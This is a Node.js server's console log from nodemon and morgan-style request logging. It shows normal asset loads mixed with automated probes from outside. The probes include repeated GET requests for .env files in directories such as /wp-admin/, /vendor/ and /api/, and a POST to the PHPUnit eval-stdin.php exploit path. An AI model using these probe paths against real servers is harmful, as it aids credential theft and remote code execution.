
> packachange@1.0.0 server
> nodemon server.js --ignore frontend_react

[33m[nodemon] 2.0.15[39m
[33m[nodemon] to restart at any time, enter `rs`[39m
[33m[nodemon] watching path(s): *.*[39m
[33m[nodemon] watching extensions: js,mjs,json[39m
[32m[nodemon] starting `node server.js`[39m
Server is running on port 80
[0mGET / [32m200[0m 7.016 ms - 2460[0m
[0mGET /static/css/2.b5378863.chunk.css [32m200[0m 5.171 ms - 49051[0m
[0mGET /static/js/main.42ef36c3.chunk.js [32m200[0m 1.384 ms - 351675[0m
[0mGET /static/js/2.b5907e94.chunk.js [32m200[0m 8.790 ms - 4033778[0m
[0mGET / [32m200[0m 0.973 ms - 2460[0m
[0mGET /.env [32m200[0m 2.749 ms - 2460[0m
[0mPOST / [33m404[0m 2499.392 ms - 140[0m
[0mPOST / [33m404[0m 0.847 ms - 140[0m
[0mGET /.env [32m200[0m 1.047 ms - 2460[0m
[0mGET /robots.txt [32m200[0m 1.374 ms - 2460[0m
[0mGET / [32m200[0m 1.306 ms - 2460[0m
[0mGET /test_404_page/ [32m200[0m 1.033 ms - 2460[0m
[0mGET /issmall/ [32m200[0m 3.465 ms - 2460[0m
[0mGET /favicon.ico [32m200[0m 1.032 ms - 3870[0m
[0mHEAD /robots.txt [32m200[0m 0.511 ms - 2460[0m
[0mGET /.env [32m200[0m 0.971 ms - 2460[0m
[0mGET / [32m200[0m 1.228 ms - 2460[0m
[0mGET /static/css/2.b5378863.chunk.css [32m200[0m 2.586 ms - 49051[0m
[0mGET /static/js/main.42ef36c3.chunk.js [32m200[0m 3.918 ms - 351675[0m
[0mGET /static/js/2.b5907e94.chunk.js [32m200[0m 2.958 ms - 4033778[0m
[0mGET /static/media/data_model.835a9af9.png [32m200[0m 1.098 ms - 33485[0m
[0mGET /favicon.ico [32m200[0m 0.674 ms - 3870[0m
[0mPOST / [33m404[0m 3.110 ms - 140[0m
[0mGET /.env [32m200[0m 1.150 ms - 2460[0m
[0mGET / [32m200[0m 0.978 ms - 2460[0m
[0mGET /.env [32m200[0m 0.989 ms - 2460[0m
[0mPOST / [33m404[0m 0.392 ms - 140[0m
[0mGET / [32m200[0m 0.896 ms - 2460[0m
[0mGET / [32m200[0m 0.955 ms - 2460[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.376 ms - 190[0m
[0mGET /.env [32m200[0m 2.667 ms - 2460[0m
[0mGET /conf/.env [32m200[0m 1.326 ms - 2460[0m
[0mGET /wp-content/.env [32m200[0m 1.068 ms - 2460[0m
[0mGET /wp-admin/.env [32m200[0m 0.823 ms - 2460[0m
[0mGET /library/.env [32m200[0m 1.016 ms - 2460[0m
[0mGET /new/.env [32m200[0m 1.424 ms - 2460[0m
[0mGET /vendor/.env [32m200[0m 1.040 ms - 2460[0m
[0mGET /old/.env [32m200[0m 0.993 ms - 2460[0m
[0mGET /local/.env [32m200[0m 0.968 ms - 2460[0m
[0mGET /api/.env [32m200[0m 1.773 ms - 2460[0m
[0mGET /blog/.env [32m200[0m 1.175 ms - 2460[0m
[0mGET /crm/.env [32m200[0m 1.096 ms - 2460[0m
